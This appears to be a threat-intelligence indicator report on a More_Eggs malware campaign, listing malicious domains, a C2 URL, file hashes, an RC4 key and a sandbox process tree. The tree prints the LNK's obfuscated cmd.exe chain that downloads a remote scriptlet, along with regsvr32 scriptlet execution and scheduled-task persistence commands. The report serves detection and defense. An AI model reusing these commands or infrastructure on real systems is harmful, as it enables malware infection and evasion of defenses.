@@ -1,0 +1,104 @@
+More_Eggs | brokerry | June 2025
+
+---------------------------------------------------------------
+IOCs
+---------------------------------------------------------------
+
+Candidate Domain
+http://brokerry.com
+brokerry.com
+
+LNK Payload
+http://brokarry.com/smjflw9s
+13.48.25.106:80
+
+Zip Download
+https://aab32.brokarry.com/check/31373439/3428119268
+
+More_Eggs C2
+https://lezkink.com/id/243149
+
+SHA256s
+e3730dd86524be44731b385561f06876a39f3b0fc21840769597d1c579e321f4
+29b1004de0001cbe9074287378a3aff23b6987766e2060492d93c8696d2e329b
+0fd6d2f360afe9b373cd883dcb7693889feecb91650212f7bad1e2dcca114027
+e13c3ff103a170306f62a988c63b58edb44116f28e56be9cfc5e1000f394d507
+ff6196c587868e959e61144e9dcb74cda98ea2b320494c69b226a5b2d9c64884
+6e261341753533303dad97cdc0aa3eeb8543cebe596f1712124de070cf2641b4
+
+---------------------------------------------------------------
+Details
+---------------------------------------------------------------
+
+LNK
+
+C:\Windows\system32\cmd.exe
+cmd /c "C:\Users\Admin\AppData\Local\Temp\Karry Brown.lnk"
+PID:5736
+C:\Windows\System32\cmd.exe
+"C:\Windows\System32\cmd.exe" /v /c set "Permit=et" && s!Permit! "Muffin=c" && s!Permit! "Verify=si" && s!Permit! "Juice=d" && s!Permit! "Crucial=a" && s!Permit! "Walks=ure = " && s!Permit! "Inquiries=ni" && s!Permit! "Numbers=t" && s!Permit! "Crime=settings" && s!Permit! "Commons=$win" && s!Permit! "Launches=version" && s!Permit! "Sentences=star" && call s!Permit! "Acoustic=%Sentences:~0,1%" && s!Permit! "Analysis=." && s!Permit! "Affiliates=e" && s!Permit! "Stomach=default" && s!Permit! "Machine=a" && !Acoustic!et "Artists=!Analysis!inf" && !Acoustic!et "Spirit=ieui!Inquiries!t!Artists!" && c!Machine!ll !Acoustic!et "Floors=%t!Affiliates!mp%\" && s!Affiliates!t "Penalties=!Floors!!Spirit!" && (for /D %v in ("[DA2]" "sc\" "ro%Chapter%j,NI,%Across%%Acids%%Acids%p%Armor%%Valid%%Valid%brokarry!Analysis!%Voices%/smjflw9s" "[2677]" "ieu%Offer%!Artists!" "[!Stomach!in!Acoustic!tall.windows7]" "Un\" "Register\" "OCXs=DA2" "!Juice!elfil!Affiliates!s=2677" "[s!Numbers!ring!Acoustic!]" "Chapter=b;Projectors" "Valid=/" "Acids=t;Revenues" "Across=h" "Offer=i!Inquiries!t" "Truth=%time%" "!Acoustic!hortsvcn!Crucial!me=' '" "!Acoustic!ervicen!Crucial!me=' '" "Armor=:;Reform" "Voices=com" "[!Launches!]" "signat!Walks!!Commons!dows nt$" "[!Juice!e!Acoustic!tinationdirs]" "!Stomach!destdir=11" "2677=01" ) do @echo %~v)>"!Penalties!" && !Acoustic!et "Indoor=ie4ui!Inquiries!t.!Affiliates!xe" && !Muffin!all x!Muffin!opy /Y /C /Q %win!Juice!ir%\!Acoustic!ys!Numbers!!Affiliates!m32\!Indoor! "!Floors!*" && !Sentences!t "" wmi!Muffin! proce!Acoustic!s call !Muffin!r!Affiliates!a!Numbers!!Affiliates! "!Floors!!Indoor! -base!Crime!" && !Sentences!t "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
+PID:5000
+C:\Windows\system32\xcopy.exe
+xcopy  /Y /C /Q C:\Windows\system32\ie4uinit.exe "C:\Users\Admin\AppData\Local\Temp\*" 
+PID:2832
+C:\Windows\System32\Wbem\WMIC.exe
+wmic  process call create "C:\Users\Admin\AppData\Local\Temp\ie4uinit.exe -basesettings" 
+PID:5248
+C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" 
+PID:5264
+C:\Users\Admin\AppData\Local\Temp\ie4uinit.exe
+C:\Users\Admin\AppData\Local\Temp\ie4uinit.exe -basesettings
+PID:3728
+C:\Users\Admin\AppData\Local\Temp\ie4uinit.exe
+C:\Users\Admin\AppData\Local\Temp\ie4uinit.exe -ClearIconCache
+PID:1236
+C:\Windows\system32\RunDll32.exe
+C:\Windows\system32\RunDll32.exe C:\Windows\system32\migration\WininetPlugin.dll,MigrateCacheForUser /m /0
+PID:4952
+C:\Windows\system32\RunDll32.exe
+C:\Windows\system32\RunDll32.exe C:\Windows\system32\migration\WininetPlugin.dll,MigrateCacheForUser /m /0
+
+
+Scriptlet
+
+regsvr32.exe /s /n /u /i:"C:\Users\Admin\AppData\Local\Temp\smjflw9s" scrobj.dll
+services.exe signed C:\Windows\system32\services.exe
+svchost.exe signed C:\Windows\system32\svchost.exe -k DcomLaunch
+WmiPrvSE.exe C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+regsvr32.exe regsvr32 /s /n /i:Kill "C:\Users\Admin\AppData\Roaming\Adobe\7001.dll"
+regsvr32.exe /s /n /i:Kill "C:\Users\Admin\AppData\Roaming\Adobe\7001.dll"
+schtasks.exe /Delete /F /TN "B7C34FCB800993"
+schtasks.exe /Create /TN "B7C34FCB800993" /XML "C:\ProgramData\Adobe\6B700F2AEA2B.txt"
+cmd.exe /v /c set "mrketaq62=dialogs" && call set "mrketaq6632=%mrketaq62:~6,1%" && !mrketaq6632!et "mrketaq76=d" && c!mrketaq76! /!mrketaq76!"C:\Users\Admin\AppData\Roaming\Adobe\" && !mrketaq76!el "7001.dll"
+WmiPrvSE.exe C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+msxsl.exe signed 206E32DB38CD1B5.txt 206E32DB38CD1B5.txt
+msxsl.exe signed more_eggs 206E32DB38CD1B5.txt 206E32DB38CD1B5.txt
+typeperf.exe typeperf.exe "\System\Processor Queue Length" -si 1 -sc 1
+typeperf.exe typeperf.exe "\System\Processor Queue Length" -si 1 -sc 1
+WmiPrvSE.exe C:\Windows\system32\wbem\wmiprvse.exe -Embedding
+svchost.exe signed C:\Windows\system32\svchost.exe -k netsvcs
+WMIADAP.exe wmiadap.exe /R /T
+svchost.exe
+taskhostw.exe signed taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
+GoogleUpdate.exe signed /c
+cmd.exe C:\Windows\system32\cmD.EXE /v /c set "nfciyoep89=updates" && call set "nfciyoep2=%nfciyoep89:~6,1%" && !nfciyoep2!et "nfciyoep62=t" && !nfciyoep2!et "nfciyoep179=i" && call !nfciyoep2!tar!nfciyoep62! ...(truncated)
+cscript.exe cscript -e:jscript B092485544F5C57D6F7.txt
+msxsl.exe signed more_eggs 206E32DB38CD1B5.txt 206E32DB38CD1B5.txt
+taskhostw.exe signed taskhostw.exe
+
+
+---------------------------------------------------------------
+Malware
+---------------------------------------------------------------
+More_Eggs
+
+C2: https://lezkink.com/id/243149
+Version: 6.7a
+RC4Key: CF8bjjs4e98dvKKfafahid3ijiafv
+
+---------------------------------------------------------------
+Samples
+---------------------------------------------------------------
+
+- https://tria.ge/250612-r4b5eaar21/behavioral1
